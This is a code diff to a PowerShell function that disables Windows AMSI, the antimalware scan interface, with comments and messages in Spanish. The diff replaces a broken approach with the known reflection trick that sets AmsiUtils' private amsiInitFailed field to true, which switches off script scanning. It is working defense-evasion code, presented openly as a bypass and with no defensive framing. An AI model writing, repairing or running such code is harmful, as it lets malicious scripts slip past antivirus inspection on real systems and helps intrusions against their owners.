@@ -121,23 +121,22 @@ public class Amsi {
     }
 
     try {
-        # Método 3: Patch de memoria en amsi.dll
-        [Delegate]::CreateDelegate(
-            [Action[IntPtr, Int32]],
-            [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
-                $_.GetName().Name -like 'System.Management.Automation'
-            } | ForEach-Object {
-                $_.GetType('System.Management.Automation.AmsiUtils')
-            } | ForEach-Object {
-                $_.GetMethod('ScanContent', [System.Reflection.BindingFlags]'NonPublic,Static')
+        # Método 3: Patch usando SetValue en amsiInitFailed
+        $assembly = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -eq 'AmsiUtils' }
+        if ($assembly) {
+            $amsiInitFailed = $assembly.GetField('amsiInitFailed', 'NonPublic,Static')
+            if ($amsiInitFailed) {
+                $amsiInitFailed.SetValue($null, $true)
+                Write-Verbose "AMSI Bypass aplicado (Método 3)"
+                return $true
             }
-        )
+        }
 
-        Write-Verbose "AMSI Bypass aplicado (Método 3)"
-        return $true
+        Write-Verbose "AMSI Bypass método 3 no pudo aplicarse"
+        return $false
     }
     catch {
-        Write-Verbose "AMSI Bypass no pudo aplicarse completamente"
+        Write-Verbose "AMSI Bypass método 3 falló: $_"
         return $false
     }
 }
